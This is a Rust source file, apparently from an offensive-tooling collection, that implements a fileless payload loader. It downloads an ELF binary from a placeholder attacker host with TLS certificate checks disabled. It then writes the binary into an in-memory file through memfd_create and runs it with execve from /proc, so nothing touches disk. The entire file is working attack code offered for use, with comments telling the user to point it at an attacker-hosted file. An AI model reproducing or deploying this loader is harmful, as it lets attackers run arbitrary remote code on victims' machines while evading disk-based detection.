// Credit to https://github.com/trickster0/OffensiveRust

use libc::{
    c_char,
    execve,
    getpid,
    memfd_create,
    write
};
use reqwest;
use std::ffi::CString;

fn download_elf() -> Vec<u8> {
    // Change to hosted file on attacker host
    let url = "http://<ip>:<port>/foo";
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let binary = client.get(url).send().unwrap().bytes().unwrap();
    binary.to_vec()
}

fn main() {
    let rs_name: &str = "foo";
    let c_str = CString::new(rs_name).unwrap();
    let c_name = c_str.as_ptr() as *const c_char;

    let elf = download_elf();

    unsafe {
        let c_elf = elf.as_ptr();
        // Create temporary file
        let fd = memfd_create(c_name, 0);
        let pid = getpid();

        // Write downloaded bytes to temporary file
        write(fd, c_elf as _, elf.len());

        let path = format!("/proc/{}/fd/{}", pid, fd);
        let cs_path = CString::new(path).unwrap();
        let c_path = cs_path.as_ptr() as *const c_char;

        // Execute ELF from memory
        execve(c_path, std::ptr::null(), std::ptr::null());
    }
}
